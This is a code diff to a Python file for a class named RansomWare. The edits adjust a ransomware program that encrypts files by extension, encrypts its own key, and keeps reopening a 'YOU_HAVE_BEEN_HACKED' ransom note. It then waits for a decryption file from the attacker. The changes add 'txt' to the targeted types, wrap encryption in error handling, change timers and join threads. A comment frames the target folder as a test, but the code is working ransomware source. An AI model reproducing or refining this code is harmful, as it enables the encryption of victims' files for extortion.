@@ -1,13 +1,13 @@
 import subprocess
 import sys
 
-def install_dependencies():
-    required_packages = ["requests==2.31.0", "cryptography==41.0.7", "pycryptodome==3.19.0", "pywin32==306"]
-    for package in required_packages:
-        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+# def install_dependencies():
+#     required_packages = ["requests==2.31.0", "cryptography==41.0.7", "pycryptodome==3.19.0", "pywin32==306"]
+#     for package in required_packages:
+#         subprocess.check_call([sys.executable, "-m", "pip", "install", package])
 
-install_dependencies()
-
+# install_dependencies()
+# pass
 import os
 import threading
 import requests
@@ -35,7 +35,7 @@ class RansomWare:
     "jpg", "jpeg", "png", "gif", "bmp", "tiff", "svg", "webp", "heif", "psd",
 
     # Text Formats
-    "pdf", "doc", "docx", "odt", "rtf", "tex", "wpd", "md",
+    "pdf", "doc", "docx", "odt", "rtf", "tex", "wpd", "md", "txt",
 
     # Spreadsheet Formats
     "xls", "xlsx", "ods", "csv",
@@ -91,10 +91,13 @@ class RansomWare:
     def crypt_file(self, file_path, encrypted=False):
         with open(file_path, 'rb') as f:
             data = f.read()
-            if not encrypted:
-                _data = self.crypter.encrypt(data)
-            else:
-                _data = self.crypter.decrypt(data)
+            try:
+                if not encrypted:
+                    _data = self.crypter.encrypt(data)
+                else:
+                    _data = self.crypter.decrypt(data)
+            except Exception as error:
+                print(error)
         with open(file_path, 'wb') as fp:
             fp.write(_data)
 
@@ -150,9 +153,11 @@ HEED THIS WARNING:
 ''')
 
     def show_ransom_note(self):
+        global rand_note
         ransom = subprocess.Popen(['notepad.exe', 'YOU_HAVE_BEEN_HACKED.txt'])
         count = 0
-        while True:
+        rand_note = True
+        while rand_note:
             time.sleep(0.1)
             top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
             if top_window == 'YOU_HAVE_BEEN_HACKED - Notepad':
@@ -162,13 +167,14 @@ HEED THIS WARNING:
                 ransom.kill()
                 time.sleep(0.1)
                 ransom = subprocess.Popen(['notepad.exe', 'YOU_HAVE_BEEN_HACKED.txt'])
-            time.sleep(60)
+            time.sleep(30)
             count +=1 
-            if count == 5:
+            if count == 2:
                 break
 
     def put_me_on_desktop(self):
-        print('Started checking for PUT_ME_ON_DESKTOP.txt')
+        global rand_note
+        print('Started checking for PUT_ME_ON_DESKTOP.txt', flush=True)
         while True:
             try:
                 file_path = f'{self.sys_root}\\Desktop\\PUT_ME_ON_DESKTOP.txt'
@@ -179,21 +185,22 @@ HEED THIS WARNING:
                         self.crypter = Fernet(self.key)
                         self.crypt_system(encrypted=True)  
                         print('System decrypted successfully.')
+                        rand_note = False
                         break
                 else:
-                    print('File not found. Retrying...')
+                    print('File not found. Retrying...', flush=True)
             except Exception as e:
                 print(f'Error: {e}')
                 traceback.print_exc()
             time.sleep(10)
 
 def main():
-    ransomware = RansomWare(local_root=r'C:\Users\fomintsovv\Desktop\MALW\test') # Only for testing purposes (remove inside parenthesis)
+    ransomware = RansomWare(local_root=r'C:\Users\malwa\Documents\targetFolder') # Only for testing purposes (remove inside parenthesis)
     ransomware.generate_key()
     ransomware.crypt_system()
     ransomware.write_key()
     ransomware.encrypt_fernet_key()
-    ransomware.change_desktop_background()
+    # ransomware.change_desktop_background()
     ransomware.what_is_bitcoin()
     ransomware.ransom_note()
 
@@ -201,10 +208,13 @@ def main():
     t2 = threading.Thread(target=ransomware.put_me_on_desktop)
 
     t1.start()
-    print('Attack execution on target machine successful; system encryption complete.')
-    print('Awaiting provision of decryption document by the attacker for the target machine.')
+    print('Attack execution on target machine successful; system encryption complete.', flush=True)
+    print('Awaiting provision of decryption document by the attacker for the target machine.', flush=True)
 
     t2.start()
+    t1.join()
+    t2.join()
+    
     print('Decryption of the target machine has been successfully completed.')
     print('Operation concluded.')
 
